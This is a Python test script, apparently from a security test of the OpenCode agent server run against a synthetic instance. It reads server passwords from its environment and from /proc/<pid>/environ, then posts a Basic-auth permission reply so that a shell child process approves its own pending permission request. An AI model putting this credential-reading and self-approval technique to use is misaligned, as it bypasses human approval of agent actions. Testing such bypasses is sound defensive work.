"""Дочерний процесс из настоящего Shell OpenCode; только синтетический сервер."""
import argparse
import base64
import json
import os
from pathlib import Path
import urllib.error
import urllib.request


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True)
    parser.add_argument("--server-pid", type=int, required=True)
    parser.add_argument("--session", required=True)
    parser.add_argument("--request", required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    # Родитель сообщает только PID созданного испытательного сервера. Его среда
    # очищена до запуска; настоящие credentials и другие /proc environ не читаются.
    candidates = []
    for name in ("OPENCODE_PASSWORD", "OPENCODE_SERVER_PASSWORD"):
        value = os.environ.get(name)
        if value:
            candidates.append(("child_environment", value))
    proc_readable = False
    try:
        raw = Path(f"/proc/{args.server_pid}/environ").read_bytes()
        proc_readable = True
        for item in raw.split(b"\0"):
            key, separator, value = item.partition(b"=")
            if separator and key in (b"OPENCODE_PASSWORD", b"OPENCODE_SERVER_PASSWORD") and value:
                candidates.append(("server_initial_environment", value.decode("utf-8")))
    except (OSError, UnicodeError):
        pass
    attempts = []
    for source, value in candidates:
        header = "Basic " + base64.b64encode(("opencode:" + value).encode()).decode()
        request = urllib.request.Request(
            f"{args.url}/api/session/{args.session}/permission/{args.request}/reply",
            data=b'{"decision":"once"}',
            headers={"authorization": header, "content-type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=5) as response:
                status = response.status
        except urllib.error.HTTPError as error:
            status = error.code
        except (OSError, urllib.error.URLError):
            status = None
        attempts.append({"source": source, "http_status": status})
        if status == 204:
            break
    report = {"proc_readable": proc_readable, "credential_source_count": len(candidates),
              "attempts": attempts, "reply_accepted": any(x["http_status"] == 204 for x in attempts)}
    args.output.write_text(json.dumps(report, sort_keys=True), encoding="utf-8")


if __name__ == "__main__":
    main()
